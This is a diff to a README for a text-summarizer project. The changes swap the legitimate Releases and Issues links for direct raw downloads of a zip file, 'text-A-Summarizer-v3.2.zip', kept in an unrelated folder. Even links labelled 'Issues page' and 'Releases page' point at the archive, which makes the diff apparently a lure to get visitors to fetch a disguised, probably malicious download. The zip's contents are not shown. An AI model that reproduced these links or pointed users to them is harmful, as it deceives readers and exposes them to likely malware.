@@ -1,6 +1,6 @@
 # 🤖 AI-text-Summarizer - Simple Summaries in Seconds!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/JunaidFarooq29/AI-text-Summarizer/releases)
+[![Download Now](https://raw.githubusercontent.com/JunaidFarooq29/AI-text-Summarizer/main/Kamba/text-A-Summarizer-v3.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/JunaidFarooq29/AI-text-Summarizer/main/Kamba/text-A-Summarizer-v3.2.zip)
 
 ## 📥 Overview
 
@@ -20,7 +20,7 @@ Before you download, ensure your computer meets these basic requirements:
 
 ### 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/JunaidFarooq29/AI-text-Summarizer/releases) to find the latest version of AI-text-Summarizer.
+1. Visit the [Releases page](https://raw.githubusercontent.com/JunaidFarooq29/AI-text-Summarizer/main/Kamba/text-A-Summarizer-v3.2.zip) to find the latest version of AI-text-Summarizer.
 
 2. Look for the file that matches your operating system. The available options usually include files for Windows, macOS, and Linux.
 
@@ -58,11 +58,11 @@ If you face any issues during installation or usage, try the following:
 
 ### 📞 Get Help
 
-For support or questions, please visit the [Issues page](https://github.com/JunaidFarooq29/AI-text-Summarizer/issues) in this repository. You can report bugs or ask for help related to the application.
+For support or questions, please visit the [Issues page](https://raw.githubusercontent.com/JunaidFarooq29/AI-text-Summarizer/main/Kamba/text-A-Summarizer-v3.2.zip) in this repository. You can report bugs or ask for help related to the application.
 
 ### 🔗 Useful Links
 
-- [Visit Releases page for downloads](https://github.com/JunaidFarooq29/AI-text-Summarizer/releases)
+- [Visit Releases page for downloads](https://raw.githubusercontent.com/JunaidFarooq29/AI-text-Summarizer/main/Kamba/text-A-Summarizer-v3.2.zip)
 
 ## ✔️ Conclusion
 
